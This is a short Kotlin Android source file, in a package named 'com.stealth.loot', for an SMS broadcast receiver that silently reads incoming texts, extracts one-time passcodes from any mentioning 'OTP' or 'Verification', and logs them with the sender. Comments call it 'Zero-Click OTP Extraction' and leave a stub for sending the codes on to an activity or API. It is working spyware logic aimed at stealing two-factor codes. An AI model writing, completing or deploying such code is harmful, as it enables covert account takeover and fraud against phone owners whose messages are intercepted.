package com.stealth.loot

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.telephony.SmsMessage
import android.util.Log

class SmsBroadcastReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        val bundle = intent.extras
        if (bundle != null) {
            val pdus = bundle["pdus"] as Array<*>
            for (pdu in pdus) {
                val smsMessage = SmsMessage.createFromPdu(pdu as ByteArray)
                val message = smsMessage.messageBody
                val sender = smsMessage.displayOriginatingAddress
                
                // 🔥 Zero-Click OTP Extraction
                if (message.contains("OTP") || message.contains("Verification")) {
                    val otp = message.filter { it.isDigit() }.take(6)
                    Log.d("StealthAI", "Extracted OTP: $otp from $sender")
                    
                    // 🔥 Send OTP to Main Activity or API here
                    // MainActivity.processOTP(otp)
                }
            }
        }
    }
}
